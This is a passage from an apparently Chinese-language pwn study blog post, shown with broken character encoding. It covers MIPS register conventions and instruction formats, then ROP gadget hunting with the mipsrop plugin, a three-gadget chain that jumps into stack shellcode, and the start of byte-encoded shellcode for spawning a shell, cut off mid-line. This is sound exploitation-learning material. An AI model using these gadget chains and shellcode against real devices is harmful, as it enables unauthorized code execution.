<p>ä¿å­˜å¯„å­˜å™¨ï¼Œåœ¨è¿‡ç¨‹è°ƒç”¨è¿‡ç¨‹ä¸­éœ€è¦ä¿ç•™ï¼ˆè¢«è°ƒç”¨è€…ä¿å­˜å’Œæ¢å¤ï¼Œè¿˜åŒ…æ‹¬$fpå’Œ$raï¼‰ï¼ŒMIPSæä¾›äº†ä¸´æ—¶å¯„å­˜å™¨å’Œä¿å­˜å¯„å­˜å™¨ï¼Œè¿™æ ·å°±å‡å°‘äº†å¯„å­˜å™¨æº¢å‡ºï¼ˆspilling,å³å°†ä¸å¸¸ç”¨çš„å˜é‡æ”¾åˆ°å­˜å‚¨å™¨çš„è¿‡ç¨‹),ç¼–è¯‘å™¨åœ¨ç¼–è¯‘ä¸€ä¸ªå¶ï¼ˆleaf)è¿‡ç¨‹ï¼ˆä¸è°ƒç”¨å…¶å®ƒè¿‡ç¨‹çš„è¿‡ç¨‹ï¼‰çš„æ—¶å€™ï¼Œæ€»æ˜¯åœ¨ä¸´æ—¶å¯„å­˜å™¨åˆ†é…å®Œäº†æ‰ä½¿ç”¨éœ€è¦ä¿å­˜çš„å¯„å­˜å™¨ã€‚</p>
<ul>
<li>$24..$25:($t8-$t9)</li>
</ul>
<p>åŒ($t0-$t7) $26..$27:($k0,$k1)ä¸ºæ“ä½œç³»ç»Ÿï¼å¼‚å¸¸å¤„ç†ä¿ç•™ï¼Œè‡³å°‘è¦é¢„ç•™ä¸€ä¸ªã€‚ å¼‚å¸¸ï¼ˆæˆ–ä¸­æ–­ï¼‰æ˜¯ä¸€ç§ä¸éœ€è¦åœ¨ç¨‹åºä¸­æ˜¾ç¤ºè°ƒç”¨çš„è¿‡ç¨‹ã€‚MIPSæœ‰ä¸ªå«å¼‚å¸¸ç¨‹åºè®¡æ•°å™¨ï¼ˆexception program counter,EPC)çš„å¯„å­˜å™¨ï¼Œå±äºCP0å¯„å­˜å™¨ï¼Œç”¨äºä¿å­˜é€ æˆå¼‚å¸¸çš„é‚£æ¡æŒ‡ä»¤çš„åœ°å€ã€‚æŸ¥çœ‹æ§åˆ¶å¯„å­˜å™¨çš„å”¯ä¸€æ–¹æ³•æ˜¯æŠŠå®ƒå¤åˆ¶åˆ°é€šç”¨å¯„å­˜å™¨é‡Œï¼ŒæŒ‡ä»¤<code>mfc0</code>(move from system control)å¯ä»¥å°†EPCä¸­çš„åœ°å€å¤åˆ¶åˆ°æŸä¸ªé€šç”¨å¯„å­˜å™¨ä¸­ï¼Œé€šè¿‡è·³è½¬è¯­å¥ï¼ˆ<code>jr</code>)ï¼Œç¨‹åºå¯ä»¥è¿”å›åˆ°é€ æˆå¼‚å¸¸çš„é‚£æ¡æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚MIPSç¨‹åºå‘˜éƒ½å¿…é¡»ä¿ç•™ä¸¤ä¸ªå¯„å­˜å™¨$k0å’Œ$k1ï¼Œä¾›æ“ä½œç³»ç»Ÿä½¿ç”¨ã€‚<br>å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œè¿™ä¸¤ä¸ªå¯„å­˜å™¨çš„å€¼ä¸ä¼šè¢«æ¢å¤ï¼Œç¼–è¯‘å™¨ä¹Ÿä¸ä½¿ç”¨k0å’Œk1,å¼‚å¸¸å¤„ç†å‡½æ•°å¯ä»¥å°†è¿”å›åœ°å€æ”¾åˆ°è¿™ä¸¤ä¸ªä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œç„¶åä½¿ç”¨jrè·³è½¬åˆ°é€ æˆå¼‚å¸¸çš„æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚</p>
<ul>
<li>$28:($gp)</li>
</ul>
<p>ä¸ºäº†ç®€åŒ–é™æ€æ•°æ®çš„è®¿é—®ï¼ŒMIPSè½¯ä»¶ä¿ç•™äº†ä¸€ä¸ªå¯„å­˜å™¨ï¼šå…¨å±€æŒ‡é’ˆgp(global pointer,$gp)ï¼Œå…¨å±€æŒ‡é’ˆæŒ‡å‘é™æ€æ•°æ®åŒºä¸­çš„è¿è¡Œæ—¶å†³å®šçš„åœ°å€ï¼Œåœ¨å­˜å–ä½äºgpå€¼ä¸Šä¸‹32KBèŒƒå›´å†…çš„æ•°æ®æ—¶ï¼Œåªéœ€è¦ä¸€æ¡ä»¥gpä¸ºåŸºæŒ‡é’ˆçš„æŒ‡ä»¤å³å¯ã€‚åœ¨ç¼–è¯‘æ—¶ï¼Œæ•°æ®é¡»åœ¨ä»¥gpä¸ºåŸºæŒ‡é’ˆçš„64KBèŒƒå›´å†…ã€‚</p>
<ul>
<li>$29:($sp)</li>
</ul>
<p>MIPSç¡¬ä»¶å¹¶ä¸ç›´æ¥æ”¯æŒå †æ ˆï¼Œä½ å¯ä»¥æŠŠå®ƒç”¨äºåˆ«çš„ç›®çš„ï¼Œä½†ä¸ºäº†ä½¿ç”¨åˆ«äººçš„ç¨‹åºæˆ–è®©åˆ«äººä½¿ç”¨ä½ çš„ç¨‹åºï¼Œè¿˜æ˜¯è¦éµå®ˆè¿™ä¸ªçº¦å®šçš„ï¼Œä½†è¿™å’Œç¡¬ä»¶æ²¡æœ‰å…³ç³»ã€‚</p>
<ul>
<li>$30:($fp)</li>
</ul>
<p>GNU MIPS Cç¼–è¯‘å™¨ä½¿ç”¨äº†å¸§æŒ‡é’ˆ(frame pointer),è€ŒSGIçš„Cç¼–è¯‘å™¨æ²¡æœ‰ä½¿ç”¨ï¼Œè€ŒæŠŠè¿™ä¸ªå¯„å­˜å™¨å½“ä½œä¿å­˜å¯„å­˜å™¨ä½¿ç”¨ï¼ˆ$s8),è¿™èŠ‚çœäº†è°ƒç”¨å’Œè¿”å›å¼€é”€ï¼Œä½†å¢åŠ äº†ä»£ç ç”Ÿæˆçš„å¤æ‚æ€§ã€‚</p>
<ul>
<li>$31:($ra)</li>
</ul>
<p>å­˜æ”¾è¿”å›åœ°å€ï¼ŒMIPSæœ‰ä¸ª<code>jal</code>(jump-and-link,è·³è½¬å¹¶ é“¾æ¥)æŒ‡ä»¤ï¼Œåœ¨è·³è½¬åˆ°æŸä¸ªåœ°å€æ—¶ï¼ŒæŠŠä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ”¾åˆ°$raä¸­ã€‚ç”¨äºæ”¯æŒå­ç¨‹åºï¼Œä¾‹å¦‚è°ƒç”¨ç¨‹åºæŠŠå‚æ•°æ”¾åˆ°$a0~$a3,ç„¶å<code>jal X</code>è·³åˆ°Xè¿‡ç¨‹ï¼Œè¢«è°ƒè¿‡ç¨‹å®ŒæˆåæŠŠç»“æœæ”¾åˆ°$v0,$v1,ç„¶åä½¿ç”¨<code>jr $ra</code>è¿”å›ã€‚</p>

        <h2 id="4-æŒ‡ä»¤"   >
          <a href="#4-æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-æŒ‡ä»¤" class="headerlink" title="4.æŒ‡ä»¤"></a>4.æŒ‡ä»¤</h2>
      
        <h3 id="1-ä¸åŒç±»å‹çš„æŒ‡ä»¤"   >
          <a href="#1-ä¸åŒç±»å‹çš„æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¸åŒç±»å‹çš„æŒ‡ä»¤" class="headerlink" title="(1)ä¸åŒç±»å‹çš„æŒ‡ä»¤"></a>(1)ä¸åŒç±»å‹çš„æŒ‡ä»¤</h3>
      
        <h4 id="Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨"   >
          <a href="#Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨" class="headerlink" title="Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨"></a>Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨</h4>
      <p>å¸¸è§æŒ‡ä»¤ï¼š<code>add</code>, <code>sub</code>, <code>and</code>, <code>or</code>, <code>nor</code>, <code>slt</code>, <code>sll</code>, <code>srl</code>, <code>jr</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150231733.png" alt="image-20211230150231733"></p>
<ul>
<li>opcodï¼šæ“ä½œç  </li>
<li>rsï¼šæºå¯„å­˜å™¨çš„æ•°é‡ </li>
<li>rtï¼šæºå¯„å­˜å™¨çš„æ•°é‡ </li>
<li>rdï¼šç›®æ ‡å¯„å­˜å™¨çš„ç¼–å·</li>
<li>shamï¼šç§»ä½é‡ï¼ˆæ“ä½œç§»ä½çš„ä½æ•°ï¼‰</li>
<li>Func: å‡½æ•°ï¼ˆæ“ä½œç æ‰©å±•ï¼‰ </li>
</ul>
<p>Shamä»…ç”¨äºæ“ä½œåç§»é‡çš„æŒ‡ä»¤ï¼ˆä¾‹å¦‚<code>stl</code>ï¼‰</p>

        <h4 id="Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡"   >
          <a href="#Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡" class="headerlink" title="Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡"></a>Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡</h4>
      <p>å¸¸è§æŒ‡ä»¤ï¼š<code>addi</code>, <code>lw</code>, <code>sw</code>, <code>lh</code>, <code>sh</code>, <code>lb</code>, <code>lbu</code>, <code>sb</code>, <code>ll</code>, <code>sc</code>, <code>lui</code>, <code>andi</code>, <code>ori</code>, <code>beq</code>, <code>bne</code>, <code>slti</code>, <code>sltiu</code></p>
<p><img   src="https://dev.azure.com/zslyvain/9285f0e6-8055-4a5c-aec3-50d9555ac078/_apis/git/repositories/4eb461c6-bb1f-489f-978b-686e8c32decf/items?path=/1625856577691_8905.png&versionDescriptor%5BversionOptions%5D=0&versionDescriptor%5BversionType%5D=0&versionDescriptor%5Bversion%5D=master&resolveLfs=true&$format=octetStream&api-version=5.0" style=""  alt="img"></p>
<ul>
<li>opcodï¼šæ“ä½œç </li>
<li>rsï¼šæºå¯„å­˜å™¨çš„æ•°é‡</li>
<li>rdï¼šæºæˆ–ç›®æ ‡å¯„å­˜å™¨çš„æ•°é‡</li>
<li>imd: ç«‹å³å€¼</li>
</ul>

        <h4 id="Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€"   >
          <a href="#Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€" class="headerlink" title="Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€"></a>Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€</h4>
      <p>å¤„ç†å™¨ç›´æ¥è·³è·ƒåˆ°ç»™å®šçš„åœ°å€ï¼Œæ‰§è¡Œæ‰€åœ¨åœ°å€çš„æŒ‡ä»¤</p>
<p>å¸¸è§æŒ‡ä»¤ï¼š<code>j</code>, <code>jal</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150255746.png" alt="image-20211230150255746"></p>
<ul>
<li>Opcodï¼šæ“ä½œç </li>
<li>Imdï¼šç«‹å³å€¼</li>
</ul>

        <h3 id="2-å¸¸ç”¨æŒ‡ä»¤"   >
          <a href="#2-å¸¸ç”¨æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="(2)å¸¸ç”¨æŒ‡ä»¤"></a>(2)å¸¸ç”¨æŒ‡ä»¤</h3>
      <p>å…¶ä¸­<code>i</code>è¡¨ç¤ºç«‹å³æ•°ç›¸å…³ï¼Œ<code>u</code>è¡¨ç¤ºæ— ç¬¦å·ç›¸å…³ã€‚</p>

        <h4 id="â‘ load-store-æŒ‡ä»¤"   >
          <a href="#â‘ load-store-æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ load-store-æŒ‡ä»¤" class="headerlink" title="â‘ load/store æŒ‡ä»¤"></a>â‘ load/store æŒ‡ä»¤</h4>
      <ul>
<li><p>laï¼šå°†åœ°å€æˆ–è€…æ ‡ç­¾å­˜å…¥ä¸€ä¸ªå¯„å­˜å™¨ eg:<code>la $t0,val_1</code>å¤åˆ¶val_lçš„åœ°å€åˆ°$t0ä¸­ï¼Œval_1æ˜¯ä¸€ä¸ªLabel</p>
</li>
<li><p>liï¼šå°†ç«‹å³æ•°å­˜å…¥é€šç”¨å¯„å­˜å™¨ eg:<code>li $t1, 40</code> $t1 = 40</p>
</li>
<li><p>lwï¼šä»æŒ‡å®šçš„åœ°å€åŠ è½½ä¸€ä¸ªwordç±»å‹çš„å€¼åˆ°ä¸€ä¸ªå¯„å­˜å™¨ eg:<code>lw $s0, 0($sp) $s0=MEM[$sp+0]</code></p>
</li>
<li><p>swï¼šå°†å¯„å­˜å™¨çš„å€¼ï¼Œå­˜äºæŒ‡å®šçš„åœ°å€wordç±»å‹ eg:<code>sw $a0, 0($sp) MEM[$sp+0] = $a0</code></p>
</li>
<li><p>moveï¼šå¯„å­˜å™¨ä¼ å€¼ egï¼š<code>move $t5, $t2 $t5 = $t2</code></p>
</li>
</ul>

        <h4 id="â‘¡ç®—æ•°æŒ‡ä»¤"   >
          <a href="#â‘¡ç®—æ•°æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡ç®—æ•°æŒ‡ä»¤" class="headerlink" title="â‘¡ç®—æ•°æŒ‡ä»¤"></a>â‘¡ç®—æ•°æŒ‡ä»¤</h4>
      <p>ç®—æ•°æŒ‡ä»¤çš„æ‰€æœ‰æ“ä½œéƒ½æ˜¯å¯„å­˜å™¨ï¼Œä¸èƒ½æ˜¯ RAM åœ°å€æˆ–é—´æ¥å¯»å€ã€‚ä¸”æ“ä½œæ•°å¤§å°éƒ½æ˜¯ wordï¼ˆ4byteï¼‰</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add $t0, $t1, $t2;		$t0=$t1+$t2;	å¸¦ç¬¦å·æ•°ç›¸åŠ </span><br><span class="line">sub $t0, $t1, $t2;		$t0=$t1-$t2;	å¸¦ç¬¦å·æ•°ç›¸å‡</span><br><span class="line">addi $t0, $t1, 5;		$t0=$t1+5;		æœ‰ç«‹å³æ•°çš„åŠ æ³•</span><br><span class="line">addu $t0, $t1, $t2;		$t0=$t1+$t2;	æ— ç¬¦å·æ•°çš„åŠ æ³•</span><br><span class="line">subu $t0, $t1, $t2;		$t0=$t1-$t2;	å¸¦ç¬¦å·æ•°ç›¸å‡</span><br><span class="line">mult $t3, $t3;			(HI, LO) = $t3 * $t4</span><br><span class="line">div $t5, $t6;			$Hi=$t5 mod $t6</span><br><span class="line">mfhi $t0;				$t0 = $Hi</span><br><span class="line">mflo $t1;				$t1 = $Lo</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¢syscall"   >
          <a href="#â‘¢syscall" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢syscall" class="headerlink" title="â‘¢syscall"></a>â‘¢syscall</h4>
      <p>äº§ç”Ÿä¸€ä¸ªè½¯åŒ–ä¸­æ–­ï¼Œå®ç°ç³»ç»Ÿè°ƒç”¨ï¼›ç³»ç»Ÿè°ƒç”¨å·å­˜æ”¾åœ¨ $v0 ä¸­ï¼Œå‚æ•°åœ¨ $a0~$a3 ä¸­ï¼›</p>
<p>è¿”å›å€¼åœ¨ $v0 ä¸­ï¼Œå¦‚æœå‡ºé”™ï¼Œåœ¨ $a3 ä¸­è¿”å›é”™è¯¯å·ï¼›åœ¨ç¼–å†™ shellcode æ—¶ï¼Œç”¨åˆ°è¯¥æŒ‡ä»¤æœºåˆ¶</p>
<p>Write(1, â€œABCnâ€, 5) å®ç°å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addiu $sp, $sp, -32;</span><br><span class="line">li $a0, 1;</span><br><span class="line">lui $t6, 0x4142;</span><br><span class="line">ori $t6, $t6, 0x430a;</span><br><span class="line">sw  $t6, $0($sp);</span><br><span class="line">addiu $a1, $sp, 0;</span><br><span class="line">li $a2, 5;</span><br><span class="line">li $v0, 4004;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤"   >
          <a href="#â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤" class="headerlink" title="â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤"></a>â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤</h4>
      <p>åˆ†æ”¯è·³è½¬æŒ‡ä»¤æœ¬èº«å¯ä»¥é€šè¿‡æ¯”è¾ƒä¸¤ä¸ªå¯„å­˜å™¨å†³å®šå¦‚ä½•è·³è½¬ï¼›å¦‚æœæƒ³è¦å®ç°ä¸ç«‹å³æ•°çš„æ¯”è¾ƒè·³è½¬ï¼Œéœ€è¦ç»“åˆç±»è·³è½¬æŒ‡ä»¤å®ç°</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b target;				æ— æ¡ä»¶è·³è½¬åˆ°targetå¤„</span><br><span class="line">beq $t0, $t1, target;	å¦‚æœ&quot;$t0 == $t1â€ï¼Œè·³è½¬åˆ°target</span><br><span class="line">blt $t0, $t1, target;	å¦‚æœâ€œ$t0 &lt; $t1â€ï¼Œè·³è½¬åˆ°target</span><br><span class="line">ble $t0, $t1, target;	å¦‚æœâ€œ$t0 &lt;= $t1â€ è·³è½¬åˆ°target</span><br><span class="line">bgt;</span><br><span class="line">blt;</span><br><span class="line">bne;					ç±»æ¯”ä¸Š</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¤è·³è½¬æŒ‡ä»¤"   >
          <a href="#â‘¤è·³è½¬æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¤è·³è½¬æŒ‡ä»¤" class="headerlink" title="â‘¤è·³è½¬æŒ‡ä»¤"></a>â‘¤è·³è½¬æŒ‡ä»¤</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">j target;			æ— æ¡ä»¶è·³è½¬target</span><br><span class="line">jr $t3;				è·³è½¬åˆ°$t3æŒ‡å‘çš„åœ°å€å¤„(Jump Register),æ²¡æœ‰ä¿å­˜åœ°å€,ä¸€èˆ¬æ˜¯å‡½æ•°è¿”å›æ—¶å€™ç”¨åˆ°çš„</span><br><span class="line">jal target;			è·³è½¬åˆ°targetï¼Œå¹¶ä¿å­˜è¿”å›åœ°å€åˆ°$raä¸­ï¼Œå¸¸è§äºå‡½æ•°è°ƒç”¨</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¥å­å‡½æ•°çš„è°ƒç”¨"   >
          <a href="#â‘¥å­å‡½æ•°çš„è°ƒç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¥å­å‡½æ•°çš„è°ƒç”¨" class="headerlink" title="â‘¥å­å‡½æ•°çš„è°ƒç”¨"></a>â‘¥å­å‡½æ•°çš„è°ƒç”¨</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jal   sub_routine_label;å¤åˆ¶è¿”å›åœ°å€åˆ°$raä¸­,å³å½“å‰PC+8çš„å€¼ï¼Œç¨‹åºè·³è½¬åˆ°sub_routine_label</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¦å­å‡½æ•°çš„è¿”å›"   >
          <a href="#â‘¦å­å‡½æ•°çš„è¿”å›" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¦å­å‡½æ•°çš„è¿”å›" class="headerlink" title="â‘¦å­å‡½æ•°çš„è¿”å›"></a>â‘¦å­å‡½æ•°çš„è¿”å›</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jr    $ra;å¦‚æœå­å‡½æ•°é‡å¤åµŒå¥—ï¼Œåˆ™å°†$raçš„å€¼ä¿å­˜åœ¨å †æ ˆä¸­ï¼Œå› ä¸º$raæ€»æ˜¯ä¿å­˜å½“å‰æ‰§è¡Œçš„å­å‡½æ•°çš„è¿”å›åœ°å€</span><br></pre></td></tr></table></div></figure>



<p>ä»¥ä¸Šå¤§å¤šå‚è€ƒå¦‚ä¸‹</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://valeeraz.github.io/2020/05/08/architecture-mips/" >MIPSæ±‡ç¼–è¯­è¨€å…¥é—¨ - Sylvainâ€™s Blog (valeeraz.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259594" >2021ç¬¬å››å±Šå¼ºç½‘æ‹Ÿæ€é˜²å¾¡ç§¯åˆ†èµ›å·¥æ§pwn eserver WP - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="5-å¸¸ç”¨ROPå¯»å€"   >
          <a href="#5-å¸¸ç”¨ROPå¯»å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-å¸¸ç”¨ROPå¯»å€" class="headerlink" title="5.å¸¸ç”¨ROPå¯»å€"></a>5.å¸¸ç”¨ROPå¯»å€</h2>
      <p>IDAä¸­</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mipsrop</span></span><br><span class="line"><span class="keyword">import</span> mipsrop</span><br><span class="line">mipsrop=mipsrop.MIPSROPFinder()</span><br><span class="line">mipsrop.find(<span class="string">&quot;&quot;</span>)</span><br><span class="line">mipsrop.stackfinder() <span class="comment">#å¯»æ‰¾æ ˆæ•°æ®å¯æ§çš„ ropï¼Œå»ºç«‹å’Œ a0ã€a1 å¯„å­˜å™¨çš„å…³ç³»</span></span><br><span class="line">mipsrop.summary() <span class="comment">#åˆ—å‡ºæ‰€æœ‰çš„å¯ç”¨ rop</span></span><br><span class="line">mipsrop.system() <span class="comment">#å¯»æ‰¾å‘½ä»¤æ‰§è¡Œçš„çš„rop</span></span><br><span class="line">mipsrop.find(<span class="string">&#x27;jr $ra&#x27;</span>)</span><br><span class="line">mipsrop.find(<span class="string">&quot;move $t9, $s3&quot;</span>)</span><br><span class="line">mipsrop.find(<span class="string">&quot;addiu $a1,$sp&quot;</span>)</span><br></pre></td></tr></table></div></figure>

<p>å¾ˆå¤šå¥½ç”¨ROPçš„å¯åœ¨libcçš„scandir_tailç±»åˆ«å‡½æ•°ä¸‹å¯ä»¥æ‰¾åˆ°</p>

        <h3 id="Shellcodeä¸‰éƒ¨æ›²"   >
          <a href="#Shellcodeä¸‰éƒ¨æ›²" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shellcodeä¸‰éƒ¨æ›²" class="headerlink" title="Shellcodeä¸‰éƒ¨æ›²"></a><code>Shellcode</code>ä¸‰éƒ¨æ›²</h3>
      
        <h4 id="1-gadget1"   >
          <a href="#1-gadget1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-gadget1" class="headerlink" title="(1)gadget1"></a>(1)gadget1</h4>
      <p>ä»spæ§åˆ¶å¯„å­˜å™¨</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lw ra,0x3c(sp);</span><br><span class="line">lw s3,0x2c(sp);</span><br><span class="line">lw s2,0x28(sp);</span><br><span class="line">lw s1,0x24(sp);</span><br><span class="line">lw s0,0x20(sp);</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªé€šå¸¸å¯ä»¥åœ¨<code>scandir_tail</code>å‡½æ•°ä¸­æ‰¾ï¼Œæˆ–è€…å¦‚ä¸‹</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.find(<span class="string">&#x27;jr $ra&#x27;</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="2-gadget2"   >
          <a href="#2-gadget2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-gadget2" class="headerlink" title="(2)gadget2"></a>(2)gadget2</h4>
      <p>ä»æ ˆå–åœ°å€ç»™å¯„å­˜å™¨ï¼Œç„¶åè·³è½¬ä¹‹å‰æ§åˆ¶ä½çš„å¯„å­˜å™¨</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addiu a1,0x18(sp);move t9,s3;jalr t9</span><br></pre></td></tr></table></div></figure>

<p>addiuæŒ‡ä»¤å³æ˜¯å–æ ˆåœ°å€åˆ°a1å¯„å­˜å™¨ï¼Œæ–¹ä¾¿ä¹‹åè·³è½¬ï¼Œå¦‚ä¸‹å¯»æ‰¾æŒ‡ä»¤</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.find(<span class="string">&quot;addiu $a1,$sp&quot;</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="3-gadget3"   >
          <a href="#3-gadget3" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-gadget3" class="headerlink" title="(3)gadget3"></a>(3)gadget3</h4>
      <p>è·³è½¬ä¿å­˜æ ˆåœ°å€çš„å¯„å­˜å™¨ï¼Œè¿›å…¥<code>shellcode</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move t9,a1;move a1,a2;jr t9</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹å¯»å€æŒ‡ä»¤</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.find(<span class="string">&quot;move $t9, $s3&quot;</span>)</span><br></pre></td></tr></table></div></figure>

<p>å› ä¸ºä¸€èˆ¬ä¸ŠåŸºæœ¬ä¸å­˜åœ¨ç›´æ¥å–æ ˆåœ°å€ç„¶åè·³è½¬çš„ï¼Œæ‰€ä»¥éœ€è¦å¤šé‡è·³è½¬æ¥å®Œæˆã€‚</p>

        <h2 id="ğŸ”ºå¯ç”¨shellcode"   >
          <a href="#ğŸ”ºå¯ç”¨shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºå¯ç”¨shellcode" class="headerlink" title="ğŸ”ºå¯ç”¨shellcode:"></a>ğŸ”ºå¯ç”¨shellcode:</h2>
      
        <h3 id="1-ç›´æ¥å¯ç”¨çš„"   >
          <a href="#1-ç›´æ¥å¯ç”¨çš„" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ç›´æ¥å¯ç”¨çš„" class="headerlink" title="(1)ç›´æ¥å¯ç”¨çš„"></a>(1)ç›´æ¥å¯ç”¨çš„</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xff\x06\x28&quot;</span>  <span class="comment"># slti $a2, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x62\x69\x0f\x3c&quot;</span>  <span class="comment"># lui $t7, 0x6962         ib</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x2f\x2f\xef\x35&quot;</span>  <span class="comment"># ori $t7, $t7, 0x2f2f    ib//</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xaf\xaf&quot;</span>  <span class="comment"># sw $t7, -0xc($sp)      </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x73\x68\x0e\x3c&quot;</span>  <span class="comment"># lui $t6, 